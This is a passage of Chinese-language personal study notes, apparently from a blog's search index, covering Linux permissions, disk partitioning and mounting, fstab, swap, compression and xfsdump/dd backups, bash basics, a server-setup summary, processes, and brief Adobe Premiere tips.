用户在目录下的有效用户组将会变成该目录的用户组 用途：若用户有w权限，则用户创建的新文件的用户组与该目录的用户组相同 Sticky Bit12[root@study tmp]# ll -d /tmp/drwxrwxrwt. 58 root root 8192 1月 2 19:41 /tmp/= SBIT只对目录有效 当用户具有wx权限 当用户建立文件或目录时，仅root和用户才有权利删除 权限的设置数字 SUID=4 SGID=2 SBIT=1 chmod 4755 file即表示-rwsrw-rw- 符号 SUID=u+s SGID=g+s SBIT=o+t -rwSrwSrwT表示没有x权限，小写才有x权限 观察文件类型使用file 文件名可以简单的判断文件的格式 查找命令和文件查找脚本文件 which [-a] command 会根据PATH变量区查，重点在于找出可执行文件 文件的查找where whereis [-bmsu] filename/dir 这个指令只会在特定的目录查找 使用where -l可以查看它查找的目录 locate/updatedb locate [-iclSr] keyword 会查找有关键字的文件 locate查找的数据是已建立的数据库/var/lib/mlocate 而这个数据库每天自动更新一次 使用updatedb可以根据/etc/updatedb.conf配置文件去更新数据库 find 功能强调，比较费磁盘资源，不得已不用 可以寻找某段时间参数的文件 查找某个人、某个群组的文件，还可以查找一些孤魂文件 支持通配符（如`-name “*keyword**”`,测试单双引号或无引号都行） 查找某类型的文件（普通f，设备bc，目录d。。） 文件大小范围查找，权限范围查找（包括特殊权限） 此外find特殊的就是支持额外的action 1[root@study /]# find / -perm /7000 -exec ls -l {} \\; 至于怎么操作，man吧 参考《鸟哥的Linux私房菜 基础学习篇》","link":"/Linux/4.%E6%93%8D%E4%BD%9C%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6.html"},{"title":"（六）管理磁盘","text":"该调教一个磁盘了 新磁盘得到一块磁盘，要进行一下操作 建立硬盘分区 对分区进行format（格式化），建立文件系统 然后可以对文件系统检验一下 最后挂载才能使用 观察磁盘分区状态lsblk list block devices，列出所有存储设备 lsblk [-] [device] -d列出磁盘本身，不列出分区数据 -f同时列出磁盘内文件系统名字 -i使用ASCII的字符输出，而不用复杂的编码 -m输出设备在/dev的权限信息 -p列出设备的完整文件名 -t列出详细数据 12345678910[manu@study ~]$ lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 40G 0 disk ├─sda1 8:1 0 2M 0 part ├─sda2 8:2 0 1G 0 part /boot└─sda3 8:3 0 30G 0 part ├─centos-root 253:0 0 10G 0 lvm / ├─centos-swap 253:1 0 2G 0 lvm [SWAP] └─centos-home 253:2 0 5G 0 lvm /homesr0 11:0 1 10.3G 0 rom /run/media/manu/CentOS 7 x86_64 NAME设备名 MAJ:MIN主要设备和次要设备代码 RM是否为可卸载设备（remove device），如光盘,usb等 SIZE容量 RO是否只读 TYPE有磁盘disk，分区partition，和只读存储器rom等 MOUNTPOINT挂载点 blkid12345678[root@study ~]# blkid/dev/sda1: PARTUUID=&quot;0914c759-c4fa-4ec5-8f17-286976c070d1&quot; /dev/sda2: UUID=&quot;1bedab37-0c01-459c-a8f7-cfd4c5f203f9&quot; TYPE=&quot;xfs&quot; PARTUUID=&quot;83aceed5-29cd-45df-9151-9f450ccdadfa&quot; /dev/sda3: UUID=&quot;YUgqln-n8fP-6ecM-NMyS-lGlw-PTrz-KTxWfv&quot; TYPE=&quot;LVM2_member&quot; PARTUUID=&quot;522d939a-fc63-4e61-af9e-6f66527afcb5&quot; /dev/sr0: UUID=&quot;2019-09-09-19-08-41-00&quot; LABEL=&quot;CentOS 7 x86_64&quot; TYPE=&quot;iso9660&quot; PTTYPE=&quot;dos&quot; /dev/mapper/centos-root: UUID=&quot;5b52ce1c-18f5-43d0-8c31-ededfefd6aeb&quot; TYPE=&quot;xfs&quot; /dev/mapper/centos-swap: UUID=&quot;080b56ed-a551-4b09-ab36-43515cdb2b78&quot; TYPE=&quot;swap&quot; /dev/mapper/centos-home: UUID=&quot;8eccf850-c8c0-4aab-a24a-55f5b4ef0dbe&quot; TYPE=&quot;xfs&quot; UUID是通用唯一标识符（Universally unique identifer），Linux会给每个设备独一无二的标识符 parted 列出磁盘的分区类型与分区信息 parted dev_name print 1234567891011[root@study ~]# parted /dev/sda printModel: VMware, VMware Virtual S (scsi) #磁盘模块名称Disk /dev/sda: 42.9GB #总容量Sector size (logical/physical): 512B/512B #每个逻辑/物理扇区容量Partition Table: gpt #分区表格式Disk Flags: pmbr_bootNumber Start End Size File system Name 标志 1 1049kB 3146kB 2097kB bios_grub 2 3146kB 1077MB 1074MB xfs 3 1077MB 33.3GB 32.2GB lvm 磁盘分区 GPT使用gdisk工具 MBR使用fdisk工具 使用完后可以用partprobe -s指令更新内核的分区表 不要去操作一个正在活动的分区，会导致系统不稳定，最好将它卸载再操作 创建文件系统也就是格式化，使用mkfs创建文件系统，以下是支持的文件系统 12[root@study ~]# mkfsmkfs mkfs.btrfs mkfs.cramfs mkfs.ext2 mkfs.ext3 mkfs.ext4 mkfs.fat mkfs.minix mkfs.msdos mkfs.vfat mkfs.xfs 可以使用mkfs -t fsname partition或者mkfs.fsname partition创建 创建xfs几乎瞬间完成，而ext4则是等了一会 其实创建时有很多选项，有关于RAID的，但都要对文件系统有所了解，针对性的创建对性能有一定的优化，想要加一些选项的话，自己man吧 文件系统检验突发情况文件系统会发生错乱，这时候就需要检验文件系统 xfs_repair xfs_repair [-fnd] 某个分区 -f后面的设备其实是个文件 官方原文：Specifies that the filesystem image to be processed is stored in a regular file at device (see the mkfs.xfs -d file option). This might happen if an image copy of a filesystem has been copied or written into an ordinary file. This option implies that any external log or realtime section is also in an ordi‐nary file. -n只是检查而不修改任何数据 -d在单人维护模式下对根目录操作 -LForce Log Zeroing. 挂载的文件系统要卸载才能操作 fsck.ext4可以对ext4检查 -p需要修复时，不用你输入y -f强制检查，一般只有遇到unclean才会强制检查 -b后接超级区块的位置（使用dumpe2fs可以查看），超级区块损坏时使用 123[root@study ~]# dumpe2fs -h /dev/sda5 | grep 'Blocks per group'dumpe2fs 1.42.9 (28-Dec-2013)Blocks per group: 32768 grep可以锁定某一串字符 我尝试用书上的指令检查了一下sda5，发现和书上发生了相同的问题，这么巧合？？ 123456789101112[root@study ~]# fsck.ext4 -b 32768 /dev/sda5e2fsck 1.42.9 (28-Dec-2013)/dev/sda5 was not cleanly unmounted, 强制检查.第一步: 检查inode,块,和大小删除 inode 1577 has zero dtime. 处理&lt;y&gt;? 是第二步: 检查目录结构第3步: 检查目录连接性Pass 4: Checking reference counts第5步: 检查簇概要信息/dev/sda5: ***** 文件系统已修改 *****/dev/sda5: 11/65536 files (0.0% non-contiguous), 12955/262144 blocks 只有出问题才去检查文件系统，没事别使用 执行命令的硬盘分区都要卸载 挂载和卸载挂载前要注意 单一文件系统不能重复挂载在其他目录 单一目录不能挂载多个文件系统 挂载点的目录最好是空的 挂载指令mount mount -a照/etc/fstab的数据将未挂载的磁盘全部挂载 mount [-l]默认显示当前挂载信息，加上l显示laber mount [-t fs] LABEL='' dir mount [-t fs] UUID='' dir mount [-t fs] dev dir 其实mount很复杂，更多信息还是man mount默认只有root才能执行 实际上不加t选项也行，系统知道该是什么文件系统，我们在格式化就已经弄好了 在命令行挂载光盘后，无法退出光驱，要先卸载 那么Linux是怎么识别这些文件系统类型的呢？ Linux通过分析super block加上自己的驱动来测试挂载，测试成功就自动挂载，测试参考两个文件 /etc/filesystems：测试挂载fs的优先级 /proc/filesystems：已挂载的fs 驱动写在下面的文件中 /lib/modules/$(uname -r)/kernel/fs/ 1234[root@study ~]# cd /lib/modules/$(uname -r)/kernel/fs/[root@study fs]# lsbinfmt_misc.ko.xz cachefiles cifs dlm ext4 fscache gfs2 jbd2 mbcache.ko.xz nfs_common nls pstore udfbtrfs ceph cramfs exofs fat fuse isofs lockd nfs nfsd overlayfs squashfs xfs 挂载vfat移动磁盘挂载时可以指定文件系统的语系，中文语系是950，By default, codepage 437 is used.还可以指定编码，比如 1mount -o codepage=950,iocharset=utf-8 UUID='' dir 如果磁盘是NTFS，那么需要安装NTFS的驱动才行 重新挂载根木目录根目录是不能卸载的，若根目录出现只读的状态，处理的办法有 reboot 重新挂载，输入mount -o remount,rw,auto / 挂载文件结构层次我的理解就是类似符号链接一样，将这个目录挂载到其他的目录，两个目录都链接到了同一个inode 指令 1mount --bind olddir dir umount卸载 umount [-fn] 设备名或者挂载点 -f强制卸载 -l立刻卸载 -n不更新/etc/mtab情况下卸载 不过要注意，要离开这个挂载点才能卸载 磁盘、文件系统参数自定义mknodLinux的文件代表设备，就是通过文件的major和minor数值来代替的，比如下面的8和0,1,2,3..就是major和minor，更多信息https://www.kernel.org/doc/html/latest/admin-guide/devices.html 1234567[manu@study ~]$ ll /dev/sda*brw-rw----. 1 root disk 8, 0 1月 10 03:22 /dev/sdabrw-rw----. 1 root disk 8, 1 1月 10 03:22 /dev/sda1brw-rw----. 1 root disk 8, 2 1月 10 03:22 /dev/sda2brw-rw----. 1 root disk 8, 3 1月 10 03:22 /dev/sda3brw-rw----. 1 root disk 8, 4 1月 10 03:22 /dev/sda4brw-rw----. 1 root disk 8, 5 1月 10 03:22 /dev/sda5 一般都是自动产生的，在某些情况下就需要手动处理，这时就需要mknod mknod dev [bcp] [Major] [Minor] b一个外接存储设备，磁盘等 c外接输入设备，如键盘鼠标etc p设备名称是一个FIFO（先进先出）文件 xfs_admin 可以修改XFS的UUID和LABLEname xfs_admin [-L label] [-u uuoid] dev -l Print the current filesystem label. -LSet the filesystem label. -uPrint the current filesystem UUID. -Uset the filesystem UUID. 12345[root@study ~]# xfs_admrein -l /dev/sda4label = &quot;&quot;[root@study ~]# xfs_admin -L yang.xfs /dev/sda4writing all SBsnew label = &quot;yang.xfs&quot; 设置UUID前，先用uuidgen产生新的、独一无二的UUID，卸载文件系统再设置 tune2fs tune2fs [-l][-L label][-U uuid] -l显示超级区块的信息 自动挂载前面手动挂载后重启，系统会查找/etc/fstab的信息挂载，自然我们也要重新手动挂载，能不能让系统自动挂载呢，这时候就要去修改fstab。有几个前提 /必须挂载，且要最先挂载 其他挂载点必须要是已建立目录，为了易读，最好按照FHS标准 所有挂载点同一时间内只能挂载一次 所有硬盘分区同一时间内只能挂载一次 卸载时要离开卸载的目录 查看fstab（filesystem table） 1234567891011# /etc/fstab# Created by anaconda on Sat Dec 28 07:29:36 2019## Accessible filesystems, by reference, are maintained under '/dev/disk'# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info##devices Mount point filesystem options dump fsck/dev/mapper/centos-root / xfs defaults 0 0UUID=1bedab37-0c01-459c-a8f7-cfd4c5f203f9 /boot xfs defaults 0 0/dev/mapper/centos-home /home xfs defaults 0 0/dev/mapper/centos-swap swap swap defaults 0 0 原文件排版不是很好，我改了一下，顺便加上了每行的注释 第一列可以是UUID、LABEL、/dev/，代表那个设备 第二列是挂载点 第三列是文件系统 第四列是文件系统参数 options 表示意义 async(异步)/sync(同步) 设置磁盘是否以异步执行，默认async auto/noauto 执行mount -a时，是否会被主动测试挂载，默认auto rw(读写)/ro(只读) 挂载的状态，若设置ro，就算有w也不能写 exec/noexec 是否可执行这个文件系统 user/nouser 是否允许用户使用mount挂载，默认nouser suid/nosuid 是否有SUID，有执行文件时还是设置suid比较好 defaults 表示rw,suid,dev(解析文件上的特殊设备),exec,auto,nouser,async 更多options参见mount(8)和https://wiki.archlinux.org/index.php/Fstab_(简体中文)) 第五列是dump备份 第六列是fsck检验扇区 比如我要挂载我的sda4，就在fstab下添加一行 1LABEL=yang.xfs /data/xfs xfs defaults 0 0 修改fstab后最好mount -a测试一下，如果重启错误会进入单人维护模式，根目录只读. 需要指令mount -n -o remount,rw / loop设备挂载有光盘镜像文件时，可以直接挂载，不用刻录 挂载CD/DVD镜像文件直接输入指令 1mount -o loop file mouontpoint 这里我碰到了一个小问题，我的CentOS-everthing有10.3G，挂载后使用ll -h看了下，整个镜像文件就像缩水一样，最小14，最大几十M，但是在桌面环境查看却没啥异样，是ll -h的单位不一样吗？ 来自几个月后的我解决了这个问题, ll -h显示的单位是bloock 制作loop设备并挂载既然镜像文件能够被挂载，于是有一个想法，就是建立一个大文件，把这个文件创建文件系统，然后挂载。感觉吧就像分区里的分区，如果某个分区太大，我可以在分出一部分，将它挂载，等于多了一个分区 1.建立大型文件123456[root@study ~]# dd if=/dev/zero of=/srv/dvd bs=1M count=512记录了512+0 的读入记录了512+0 的写出536870912字节(537 MB)已复制，3.77046 秒，142 MB/秒[root@study ~]# ll -h /srv/dvd-rw-r--r--. 1 root root 512M 1月 10 19:57 /srv/dvd dd ifinput file，/dev/zero是一个一值输出0的设备 ofouput file bsblock size countbs*count 2.创建文件系统、挂载默认的xfs不能格式化文件，需要加上-f选项 mkfs.xfs -f file 查看UUID 挂载mount -o loop UUID=&quot;&quot; dir 想要永久挂载就更新fstab 注意设备名不建议写UUID，UUID通常是设备上的，最好使用文件名，不容易出现错误 内存交换分区swap当内存不足时会将以一些数据暂存swap，在现在的来说很少用到，毕竟现在内存这么大， 动不动就是64G的，一般是用到服务器上以备不时之需的。 一般建立系统时可以创建swap 进入系统的创建方法 1.划出一个物理分区创建为swap 使用gdisk分区，分区默认code是8300，改成8200就代表swap 格式化分区使用mkswap /dev 挂载，不过不是用mount，而是swapon /dev free和swapon -s可以查看内存使用量 2.大型文件转为swap 类似于loop设备文件，使用dd创建一个大文件，将其格式化，挂载就可以了 格式化指令mkswap dir 挂载指令swapon dir 关闭swap指令swapoff dir/dev 此外要自动挂载的话，更新fstab要注意文件的UUID系统搜不到，swap的挂载点要设为swap 分区通用指令parted parted [dev] [command [options]] command 创建分区：mkpart [primary|logical|Extended] [ext4|vfat|xfs] 显示指令：print 删除分区：rm [partition] 参考《鸟哥的Linux私房菜 基础学习篇》","link":"/Linux/6.%E7%AE%A1%E7%90%86%E7%A3%81%E7%9B%98.html"},{"title":"（七）压缩与备份","text":"这世界没有压缩怎么行 一、压缩简介日常的文件都是由01这两个数字组成的，1B=8bit，记录整数1时，其他位会补零，压缩就是使文件的空余的位放出来，把容量节省出来 更多解释文档 我们常见的压缩包后缀有 *.Z *.zip *.gz *.bz2 *.xz *.tar *.tar.gz *.tar.bz2 *.tar.xz 二、压缩指令gzip 可以解压compress、zip、gzip等软件的压缩包 建立的压缩包后缀是*.gz 语法 123456gzip [-] file-c: 将压缩的数据输出到屏幕上-d: 解压缩-t: 检验压缩包的一致性-v: 显示原文件与压缩文件之比-#: #可以是1-9的数字，1压缩程度最小，速度快，9压缩程度最好，速度慢，默认-6 要想查看gzip压缩的内容要使用zcat/zmore/zless，查找某数据则使用egrep 因为gzip主要是想替换compress这个压缩软件，所以gzip同样可以解压compress压缩的文件，zcat也可以查看compress压缩的内容 压缩文件名自定义使用指令gzip -c filename &gt; 自定义文件名.gz 更多高级用法man bzip2语法 1234567bzip2 [-] file-c: 将压缩的数据输出到屏幕上-d: 解压缩-k: 保留原来的文件-z: 压缩(默认)-v: 显示原文件与压缩文件之比-#: #可以是1-9的数字，1压缩程度最小，速度快，9压缩程度最好，速度慢，默认-6 后缀*.bzip2 查看压缩内容有bzcat/bzmore/bzless/bzgrep xz123456xz [-] file-d: 解压缩-t: 测试压缩文件是否错误-l: 列出压缩文件的信息-k: 保留源文件-c: 输出数据 后缀*.xz xzcat/xzmore/xzless/xzgrep 总结 三个软件的压缩比从小到大是xz&gt;bzip2&gt;gzip，压缩比越小压缩效率越好 压缩效率越好花费时间越长 三、打包指令tar使用tar时要自己命名 语法 1234567891011121314tar [-z|j|J] [cv|tv|xv] [-f filename] [sourcefile]options-c: 打包文件，-v可以查看打包的文件-t: 查看打包文件包含了哪些文件-x: 解包，使用-C后可接解包目录-z: 通过gzip的形式解压、压缩，建议后缀tar.gz-j: 通过bizp2的形式压缩、解压，建议后缀tar.bzip2-J: 通过xz的形式压缩、解压，建议后缀tar.xz-v: 压缩、解压过程中，显示处理的文件，解压时显示属性权限-f filename: c{z|j|J} 代表处理后的名字，t|x代表要处理的文件-C dir: 解压的目录-p: 保留权限和属性-P:保留绝对路径--exclude=FILE: FILE表示这个文件不会被打包 尝试压缩/etc这个目录的文件，42M的源文件 纯tar后37M gz形式的tar12M xz形式的tar8.2M 1.不过值得一提的是gz花的时间几乎1s，xz花了几乎有半分钟 2.解压过程中把路径中的/自动去掉了是防止解压时将文件放到/etc中去，要备份/就要加-P 3.使用time 指令会把这个指令花费的时间显示出来 12345[root@study ~]# du -sh /etc;ls -lh etc.tar.gz /tmp/etc.tar /tmp/etc.tar.xz 42M /etc-rw-r--r--. 1 root root 12M 1月 12 21:58 etc.tar.gz-rw-r--r--. 1 root root 37M 1月 12 12:54 /tmp/etc.tar-rw-r--r--. 1 root root 8.2M 1月 12 22:13 /tmp/etc.tar.xz 特殊用法 比如只想解压出包里的一个文件时 先用tv查询包得到file 1tar -xv -f .tar file 不想打包包里的某文件时 –exclude=file 打包比某时刻还新的文件 先确定时间种类和某个时间 参考指令tar -cv -f filename --newer-mtime=&quot;YYYY/mm/DD&quot; souredir/file 四、xfs文件系统备份和还原xfsdump&amp;xfsrestore这两个工具对CentOS来说挺重要的，专门针对xfs文件系统 （一）xfsdump备份xfs文件系统 主要两个功能 完整的备份整个文件系统 和以前的备份对比进行增量备份 限制 只能备份挂载的文件系统 需要神的旨意（root） 只能搞xfs系统 恢复只能让xfsrestore解析 不能备份两个相同UUID的文件系统，因为xfsdump使用UUID来识别每个文件 语法 123456xfs [-L label] [-M label] [-l #] [-f file] dumpfile-L: 记录每次备份的session标头，针对该文件系统的简易说明-M: 记录存储媒介表头，写这个媒介的简易说明-l: 指定等级0-9，0代表完全备份-f: 后接备份后的文件名-I: 从/var/lib/xfsdump/inventory读取备份信息 例子 整个备份/boot（注意/boot是一个单独的文件系统）到/srv/boot.dump 1xfsdump -l 0 -L boot -M boot -f /srv/boot.dump /boot 增量备份/boot 1xfsdump -l 1 -L boot_1 -M boot_1 -f /srv/boot.dump1 /boot （二）系统还原xfsrestore 简单语法 1234567891.xfsrestore - Is2.xfsrestore [-f backupfile] [-L label] restoredir3.xfsrestore [-f backupfile] -i restoredir-I: 与xfsdump -I相同，显示备份信息-f: 后接备份文件-L: 后接session的标头-s: 后接恢复的指定文件和目录-r: 有磁带时使用-i: 进入交互模式，高端恢复操作 例子 恢复完整的文件系统 1xfsrestore -f /srv/boot.dump -L boot /tmp/boot 恢复增量备份 1xfsrestore -f /srv/boot.dump1 -L boot_1 /tmp/boot 使用diff -r dir1 dir2可以比较连个目录的不同支持 恢复部分文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root@study ~]# xfsrestore -f /srv/boot.dump -i /tmp/bootxfsrestore: using file dump (drive_simple) strategyxfsrestore: version 3.1.7 (dump format 3.0) - type ^C for status and controlxfsrestore: searching media for dumpxfsrestore: examining media file 0xfsrestore: dump description: xfsrestore: hostname: study.centos.vbirdxfsrestore: mount point: /bootxfsrestore: volume: /dev/sda2xfsrestore: session time: Mon Jan 13 21:39:48 2020xfsrestore: level: 0xfsrestore: session label: &quot;boot&quot;xfsrestore: media label: &quot;boot&quot;xfsrestore: file system id: 1bedab37-0c01-459c-a8f7-cfd4c5f203f9xfsrestore: session id: fe824faa-abad-43a8-ae88-9bcfe030fa59xfsrestore: media id: 705e7452-4a61-4879-bcce-c358b1cfe43dxfsrestore: using online session inventoryxfsrestore: searching media for directory dumpxfsrestore: reading directoriesxfsrestore: 11 directories and 339 entries processedxfsrestore: directory post-processing ========================== subtree selection dialog ==========================the following commands are available: pwd ls [ &lt;path&gt; ] cd [ &lt;path&gt; ] add [ &lt;path&gt; ] delete [ &lt;path&gt; ] extract quit help -&gt; ls 114 initramfs-3.10.0-1062.el7.x86_64kdump.img 113 1.text 75 initramfs-3.10.0-1062.el7.x86_64.img 77 vmlinuz-0-rescue-1eb9996494284b65aee1669488d9aae0 76 initramfs-0-rescue-1eb9996494284b65aee1669488d9aae0.img 74 vmlinuz-3.10.0-1062.el7.x86_64 73 symvers-3.10.0-1062.el7.x86_64.gz 72 config-3.10.0-1062.el7.x86_64 71 System.map-3.10.0-1062.el7.x86_64 70 .vmlinuz-3.10.0-1062.el7.x86_64.hmac 68 grub/ 1572928 grub2/ 67 efi/ -&gt; q --------------------------------- end dialog ---------------------------------xfsrestore: Unmark and quitxfsrestore: restore complete: 44 seconds elapsedxfsrestore: Restore Summary:xfsrestore: stream 0 /srv/boot.dump OK (success)xfsrestore: Restore Status: SUCCESS add添加恢复文件、目录，extract开始恢复 另外使用-s file/dir也可以恢复指定文件目录 五、其他压缩备份指令dd（disk dump）常用来备份文件系统，会将文件系统完整的备份，包括UUID 语法 12345dd if= of= bs= count=if: input file/devof: output file/devbs: 每个block的大小，默认512KBcount: block的数量 例子 我想把/boot备份一下，步骤如下 备份的地方：U盘，其他分区等，没多余的U盘，这里我选择分区 gdisk分出2GB的分区/dev/sda4(容量的要求要比挂载/boot的设备大) 12345Number Start (sector) End (sector) Size Code Name 1 2048 6143 2.0 MiB EF02 2 6144 2103295 1024.0 MiB 0700 3 2103296 65026047 30.0 GiB 8E00 4 65026048 69220351 2.0 GiB 8300 Linux filesystem 使用df /boot查出挂载在/boot的设备 123[root@study /]# df /boot文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda2 1038336 218416 819920 22% /boot 使用dd if=/dev/sda2 of=dev/sda4备份 1234[root@study /]# dd if=/dev/sda2 of=/dev/sda4记录了2097152+0 的读入记录了2097152+0 的写出1073741824字节(1.1 GB)已复制，7.00172 秒，153 MB/秒 因为Linux通过识别UUID来识别设备，而dd将UUID复制过来了，不能直接挂载，需要做准备工作 xfs_repair -L /dev/sda4清除log（日志记录了UUID） uuidgen产生新UUID xfs_admin -U UUID /dev/sda4自定义UUID 此时就算备份完成了，将设备挂载即可 12345[root@study /]# mount /dev/sda4 /mnt[root@study /]# df -h /mnt /boot文件系统 容量 已用 可用 已用% 挂载点/dev/sda4 1014M 214M 801M 22% /mnt/dev/sda2 1014M 214M 801M 22% /boot 可以发现备份的sda4与sda2一模一样，但是有个小问题，我原本的sda4是有2G的，怎么变成1G了？ 那是因为dd将sda2的所有信息都拷过来了，分区，格式，元数据，导致两个硬盘一模一样，这时候需要执行xfs_growfs /mnt即可（具体原因在未来的章节）","link":"/Linux/7.%E5%8E%8B%E7%BC%A9%E4%B8%8E%E5%A4%87%E4%BB%BD.html"},{"title":"（九）Bash shell","text":"说Bash之前，先说一下shell，在运行C程序时，windows有一个黑色的窗口，那就是shell，简单来说就是用户可以通过shell操作内核，内核可以调控硬件，而bash就是一个shell。 至于现在有这么多图形环境为什么还要学shell，咳咳，技多不压身，主要是因为图形的工具是集成的，并不是一个完整的一个程序，有一些功能只有shell才能完成，更多原因是Linux发行版都有bash shell。 Linux里面不只bash shell，更多的shell请查看/etc/shells，这是个文件 1234567[manu@study ~]$ cat /etc/shells/bin/sh/bin/bash/usr/bin/sh/usr/bin/bash/bin/tcsh/bin/csh 用户登陆时，系统会给一个默认的shell，具体是哪个shell，查看/etc/passwd文件 bash shell的功能1.记录历史命令使用命令时，可以发现使用上下键可以得到以前输入的命令，而这个命令的记录就在~/.bash_history文件里，当然记录命令有好有坏，它可以查询以前的指令，但当被黑客入侵时，翻找命令就会找到以前的重要信息 2.命令文件补全功能可以补全命令、参数、文件等，可以少打很多字，确保正确 使用首字母和两下tab就可以得到关于字母的所有指令 3.命令别名当某命令很长，而我们又常用时，就可以给他取一个“小名”，比如 1alias ll='ls -l' 这样ll就代表ls -l 4.任务管理、前台、后台控制(job control foreground background)5.程序化脚本(shell scripts)类似windows上的批处理功能 6.通配符(wildcard)就像*可以代表任意字符一样 bash简单操作查看指令是否为bash的内置指令当man cd时，实际跳转的事bash的页面，所以cd就是bash的内置指令，可以使用type来观察某指令是bash的还是其他的指令 语法 1234type [-] command-t:会以file（外部），alias（别名），builtin（bash内置）显示-p:如果时外部指令，显示路径-a:显示在[PATH]的所有command命令 命令的执行与编辑前面说过\\可以将太长的指令转到下一行来输入，这个\\就是转义字符，顾名思义就是将它原本的意思转变成别的意思，在这里就是将enter键原本的意思（执行）转变成下一行输入的意思，要特别注意一点，/必须和enter紧贴着，因为\\只转紧跟着的下一个字符","link":"/Linux/9.bash-shell.html"},{"title":"Linux服务器架设总结","text":"学好如何搭建服务器及后期维护, 本文参考CentOS进行学习 1.搭建服务器之前的准备 使用LVM管理磁盘方便后期弹性变化分区 2.网络的基本概念 端口和网络服务对应在/etc/services DNS服务器IP在/etc/resolv.conf 主机地址全为0是Network, 全为1是Broadcast(通过IP/Netmask计算得出) 将数据发往非同一网络内的主机需要Gateway ARP table负责记录MAC与对应IP LoopBack网段在127.0.0.0/8 每个主机都有路由表, 使用命令route可以查询, 其中最重要的就是默认网关 ICMP负责汇报网络情况 只有root才能使用小于1024的端口 以太网传输数据的技术是CSMA/CD MTU标准定义为1500Bytes, 可以更改MTU的值, 但需要考虑整个网络. 在支持Jumbo frame的设备上一般将MTU设置成9000Bytes. 3.局域网架构简介 在linux上购买网卡需要注意驱动 Cat 5网线可以尝试自行压制, 由于蕊线裸露, 影响到电子屏蔽效应, 超过Cat 5等级的网线建议购买现成 购买无线网卡AP时, 考虑安全因素(监听), 需要网卡能限制MAC上网 上网速度并不全与网络带宽有关, 还要考虑自身配置以及传输接口的能力 4.连接到Internet NIC(网卡)需要内核的支持, 如果内核不支持则需要重新编译内核与网卡的内核模块(需要厂商开放源码), 或者换一张Linux支持的NIC dmesg会显示kernel ring buffer的内容, 引导系统会将硬件及驱动信息写到这个缓冲区内 lspci可以查询设备芯片数据 lsmod可以显示已加载的模块 lsusb显示usb设备 modinfo可以显示模块信息 modprobe用于加载模块 可以在/etc/modprobe.d/下配置模块与设备的联系, 一般在内核捕捉不到网卡时使用 修改的参数 配置文件和启动脚本 IP相关 /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/init.d/network restart DNS /etc/resolv.conf hosts /etc/sysconfig/network /etc/hosts 修改主机名后查看是否能ping通, 否则某些服务会启动得很慢(在查找hosts) DHCP会主动修改网络配置文件 查询主机名和IP顺序: /etc/hosts--&gt;/etc/resolv.conf ping得到IP但网址无法进入, 大概率域名解析错误 网关不能重复设置, 比如网卡的配置文件与拨号上网的配置文件重复设置网关 5.Linux常用的网络命令 通过ifconfig可以查询、配置网卡和IP网络等参数, 重启后消失 由于ifdown 会分析当前网络参数是否与配置文件相同, 所以使用ifconfig修改参数后不能使用ifdown 一个网络接口就是一个路由, 数据包会根据路由表顺序发送数据(route) ping&amp;traceroute 是可以使用ICMP协议的网络程序 telnet传递明文数据, 非常危险 ping可以向网络中强制发送不可拆解的大数据包来侦测MTU大小 nc有的系统称为netcat 6.网络的安全与主机基本防护常见攻击手段 弱密码 利用程序漏洞 社会工程学 被动攻击(浏览恶意网站) 蠕虫和木马ROOKIT(会伪装) 在CentOS里可以使用rpm -Va查询被修改的文件 此外可以使用RKHunter来检测后门 DDOS(如SYN泛洪) 防护手段 使用强密码(大小写字母、数字和符号的组合. 密码越长越强) 设定用户密码规则 关闭不必要的网络服务, 并随时保持最新(软件) 不要在网络上透露帐号密码等信息 不要连接不明主机 完善防火墙 监控日志","link":"/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E6%80%BB%E7%BB%93.html"},{"title":"进程","text":"触发一个事件时，系统都会把它定义为一个进程，给进程赋予一个ID，也就是PID，同时触发这个进程的用户与相关属性关系，给予PID一组有效的权限设置 进程和程序 程序都是二进制文件，执行一个程序（命令）就会产生一个进程，获得一个pid 程序有rwx三组权限，每个用户执行同一程序时所获得的权限是不一样的 程序一般都放在物理磁盘里，通过用户执行后加载到内存中成为进程，进程会给予用户权限和属性等参数，以及进程需要的脚本或数据，在给一个PID，这个PID是根据用户的UID/GID而来的，相当于用户的权限，而由这个进程衍生出的其他进程在一般状态下也会沿用这个进程的相关权限 子进程与父进程一个进程衍生出来的进程就叫子进程，这个进程就叫父进程，子进程会显示父进程的PID，也就是PPID（parent PID） 实践： 在原有bash环境下执行bash，输入ps -l 123456[root@study ~ 21:20 #19] # bash[root@study ~ 22:23 #1] # ps -lF S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD4 S 0 2965 2958 0 80 0 - 29274 do_wai pts/0 00:00:00 bash4 S 0 35485 2965 0 80 0 - 29191 do_wai pts/0 00:00:00 bash0 R 0 35532 35485 0 80 0 - 38312 - pts/0 00:00:00 ps","link":"/Linux/%E8%BF%9B%E7%A8%8B.html"},{"title":"学习PR","text":"记录学习pr的过程 录机与放机录机: 源面板 放机: 目标面板 源面板和目标面板都可以进行选材, 可以选择插入和覆盖 拖动素材需要注意一点就是轨道的第一选项一定要选中, 不然不能拖进该轨道 拖入素材时视频和音频是链接着的，想分开可以右键取消链接 添加标记添加标记方便寻找某些视频片段(在长视频里), 在窗口的标记菜单里可以为标记添加更多介绍. 也可以在时间轴里添加标记 速度为视频增减速度的原理就是插帧和减帧，可通过以下操作调整 时间轴面板选中素材右键–&gt;速度/持续时间 工具面板–&gt;比率拉伸工具 在速度里支持倒放 序列序列就是一个剪辑后的视频，可以将一个序列当成一个素材导入其他序列，可以导入细节，也可以整体导入 巧用序列嵌套: 需要做一个重复效果时, 比如无限旋转, 可以做一个旋转一圈的序列1, 然后将序列1*n复制得到序列2. 另一个例子就是画中画中画, 虽然效果有现成的(视频效果–&gt;风格化–&gt;复制) 效果控件添加关键帧，制作动画，调整位置，添加转场… 添加的各种视频效果也是在这里调整 常用效果: 边角定位 风格化 交叉溶解 超级键（抠图用） 老电影特效: lumetri预设&gt;黑白胶片, 颜色矫正&gt;颜色平衡 阴影和中间调高光蓝色降低, 红色稍微提高 音量与亮度 Ctrl+鼠标点击音量/亮度控制线可以添加关键帧 音量可以由主声道来控制全局 调整速度/变速可以为视频增减速度时添加一点效果 点击fx, 如图选中速度 